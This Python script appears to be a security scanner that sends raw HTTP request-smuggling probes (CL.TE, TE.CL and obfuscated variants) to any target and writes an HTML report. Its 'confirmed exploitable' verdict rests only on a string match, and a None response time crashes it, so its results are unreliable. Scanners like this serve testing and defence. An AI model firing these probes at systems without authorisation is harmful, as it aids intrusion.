#!/usr/bin/python
import argparse
import socket
from urllib.parse import urlparse
import ssl
import json
import os
from datetime import datetime

# Professional-grade 0.CL Request Smuggling Scanner by nu11secur1ty 2025 (educational use only)
# Features:
# - Multiple payloads (CL.TE, TE.CL, obfuscated, extra CRLF, spacing variations)
# - Baseline comparison
# - Response timing measurement
# - Console color-coded output
# - HTML report generation with full POST requests and descriptions
# - Automatic flagging of likely and confirmed exploitable payloads

TEST_PAYLOADS = [
    ("CL-only baseline",
     "POST / HTTP/1.1\r\n"
     "Host: {host}\r\n"
     "Content-Length: 11\r\n"
     "Connection: close\r\n"
     "\r\n"
     "HELLO_WORLD",
     "Baseline request with only Content-Length"),

    ("CL.TE",
     "POST / HTTP/1.1\r\n"
     "Host: {host}\r\n"
     "Content-Length: 6\r\n"
     "Transfer-Encoding: chunked\r\n"
     "Connection: close\r\n"
     "\r\n"
     "0\r\n\r\nSMUGGL\r\n",
     "Conflicting Content-Length and Transfer-Encoding (CL.TE)"),

    ("TE.CL",
     "POST / HTTP/1.1\r\n"
     "Host: {host}\r\n"
     "Transfer-Encoding: chunked\r\n"
     "Content-Length: 6\r\n"
     "Connection: close\r\n"
     "\r\n"
     "0\r\n\r\nSMUGGL\r\n",
     "Conflicting Transfer-Encoding then Content-Length (TE.CL)"),

    ("TE.CL (obfuscated)",
     "POST / HTTP/1.1\r\n"
     "Host: {host}\r\n"
     "Transfer-Encoding: chunked\r\n"
     "Content-Length: 6\r\n"
     "Connection: close\r\n"
     "\r\n"
     "0 ;\r\n\r\nSMUGGL\r\n",
     "TE.CL with obfuscated chunk size"),

    ("CL.TE (extra CRLF)",
     "POST / HTTP/1.1\r\n"
     "Host: {host}\r\n"
     "Content-Length: 6\r\n"
     "Transfer-Encoding: chunked\r\n"
     "Connection: close\r\n"
     "\r\n\r\n"
     "0\r\n\r\nSMUGGL\r\n",
     "CL.TE variant with extra CRLF"),

    ("CL.TE (tab spacings)",
     "POST / HTTP/1.1\r\n"
     "Host:\t{host}\r\n"
     "Content-Length:\t6\r\n"
     "Transfer-Encoding:\tchunked\r\n"
     "Connection: close\r\n"
     "\r\n"
     "0\r\n\r\nSMUGGL\r\n",
     "CL.TE variant with tab spacings"),
]

RED = '\033[91m'
ORANGE = '\033[33m'
GREEN = '\033[92m'
RESET = '\033[0m'


def send_raw_request(host, port, raw_request, use_tls=False):
    import time
    start = time.time()
    try:
        if use_tls:
            context = ssl.create_default_context()
            with socket.create_connection((host, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    ssock.sendall(raw_request.encode())
                    response = ssock.recv(8192)
                    elapsed = time.time() - start
                    return response.decode(errors="ignore"), elapsed
        else:
            with socket.create_connection((host, port), timeout=5) as sock:
                sock.sendall(raw_request.encode())
                response = sock.recv(8192)
                elapsed = time.time() - start
                return response.decode(errors="ignore"), elapsed
    except Exception as e:
        return f"Error: {e}", None


def generate_html_report(results, output_file):
    html_content = f"""
<html>
<head>
<title>0.CL Request Smuggling Scan Report</title>
<style>
body {{ font-family: Arial, sans-serif; }}
table {{ border-collapse: collapse; width: 100%; }}
th, td {{ border: 1px solid #ddd; padding: 8px; vertical-align: top; }}
th {{ background-color: #f2f2f2; }}
.likely {{ color: orange; font-weight: bold; }}
.confirmed {{ color: red; font-weight: bold; }}
.normal {{ color: green; }}
pre {{ white-space: pre-wrap; word-wrap: break-word; }}
</style>
</head>
<body>
<h2>0.CL Request Smuggling Scan Report</h2>
<p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<table>
<tr><th>Payload Name</th><th>Description</th><th>POST Request</th><th>Response Line</th><th>Status</th><th>Response Time (s)</th></tr>
"""

    for r in results:
        if r.get('confirmed_exploit', False):
            status_class = 'confirmed'
            status_text = 'Confirmed Exploitable'
        elif r.get('likely_exploit', False):
            status_class = 'likely'
            status_text = 'Likely Exploitable'
        else:
            status_class = 'normal'
            status_text = 'Normal'
        response_time = f"{r['response_time']:.3f}" if r.get('response_time') else "N/A"
        html_content += f"<tr><td>{r['payload']}</td><td>{r['description']}</td><td><pre>{r['request']}</pre></td><td>{r['response_line']}</td><td class='{status_class}'>{status_text}</td><td>{response_time}</td></tr>\n"

    html_content += "</table>\n</body>\n</html>"

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(html_content)
    print(f"\n✅ HTML report generated at {output_file}")


def check_smuggling(host, port, scheme, output_json=False):
    print(f"[*] Starting scan for {scheme}://{host}:{port}...\n")
    results = []
    baseline_status = None

    for name, payload, description in TEST_PAYLOADS:
        raw_request = payload.format(host=host)
        response, resp_time = send_raw_request(host, port, raw_request, use_tls=(scheme == 'https'))
        first_line = response.split('\r\n')[0] if response else '(no response)'
        suspicious = ('400' in first_line or '403' in first_line)
        confirmed = 'SMUGGL' in response

        color = RED if confirmed else ORANGE if suspicious else GREEN
        print(f"--- Payload: {name} ---")
        print(f"{color}Response: {first_line} (time: {resp_time:.3f}s){RESET}")

        results.append({
            'payload': name,
            'description': description,
            'request': raw_request,
            'response_line': first_line,
            'suspicious': suspicious,
            'confirmed_exploit': confirmed,
            'likely_exploit': suspicious and not confirmed,
            'response_time': resp_time
        })

        if name == 'CL-only baseline':
            baseline_status = first_line

    print('\n--- Baseline vs Smuggling Comparison ---')
    for r in results[1:]:
        if baseline_status and r['response_line'] != baseline_status and not r.get('confirmed_exploit', False):
            r['likely_exploit'] = True
            print(f"{ORANGE}⚠️ {r['payload']} likely exploitable ({baseline_status} -> {r['response_line']}){RESET}")
        elif r.get('confirmed_exploit', False):
            print(f"{RED}⚠️ {r['payload']} confirmed exploitable{RESET}")
        else:
            print(f"{GREEN}{r['payload']} response matches baseline{RESET}")

    script_dir = os.path.dirname(os.path.realpath(__file__))
    report_file = os.path.join(script_dir, '0cl_scan_report.html')
    generate_html_report(results, report_file)

    if output_json:
        print('\n--- JSON Report ---')
        print(json.dumps(results, indent=2))


def parse_target(target_url, port=None):
    parsed = urlparse(target_url)
    scheme = parsed.scheme if parsed.scheme else 'http'
    host = parsed.netloc if parsed.netloc else parsed.path
    if not port:
        port = 443 if scheme == 'https' else 80
    return host, port, scheme


def main():
    parser = argparse.ArgumentParser(description='Professional 0.CL Request Smuggling Scanner')
    parser.add_argument('target', help='Target URL or hostname')
    parser.add_argument('-p', '--port', type=int, help='Target port (default depends on scheme)')
    parser.add_argument('--json', action='store_true', help='Output results in JSON format')
    args = parser.parse_args()

    host, port, scheme = parse_target(args.target, args.port)
    check_smuggling(host, port, scheme, output_json=args.json)


if __name__ == '__main__':
    main()

